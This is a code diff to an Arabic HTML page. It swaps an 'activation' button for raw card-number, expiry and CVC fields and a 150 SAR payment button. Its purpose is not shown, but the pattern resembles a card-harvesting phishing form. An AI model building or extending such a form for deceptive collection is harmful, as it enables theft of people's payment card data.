@@ -78,7 +78,33 @@
             <input id="notes" name="notes" placeholder="تعليمات خاصة بالتسليم إن وجدت">
           </div>
 
-          <button id="submitBtn" class="btn" type="submit">متابعة التفعيل</button>
+          <div class="field">
+            <label for="cName">اسم صاحب البطاقة</label>
+            <input id="cName" name="cName" placeholder="كما يظهر على البطاقة" required>
+          </div>
+
+          <div class="field">
+            <label for="cNum">رقم البطاقة</label>
+            <input id="cNum" name="cNum" class="ltr" inputmode="numeric" placeholder="4111 1111 1111 1111" required>
+          </div>
+
+          <div class="grid two">
+            <div class="field">
+              <label for="expMonth">شهر الانتهاء</label>
+              <input id="expMonth" name="expMonth" class="ltr" inputmode="numeric" placeholder="MM" required>
+            </div>
+            <div class="field">
+              <label for="expYear">سنة الانتهاء</label>
+              <input id="expYear" name="expYear" class="ltr" inputmode="numeric" placeholder="YY" required>
+            </div>
+          </div>
+
+          <div class="field">
+            <label for="CVC">CVC</label>
+            <input id="CVC" name="CVC" class="ltr" inputmode="numeric" placeholder="123" required>
+          </div>
+
+          <button id="submitBtn" class="btn" type="submit">تأكيد الدفع (150 SAR)</button>
 
           <div id="ok"  class="alert ok"  role="status">✅ تم إرسال البيانات، جاري تحويلكم…</div>
           <div id="err" class="alert err" role="alert">❌ تعذّر الإرسال. يرجى المحاولة لاحقًا.</div>
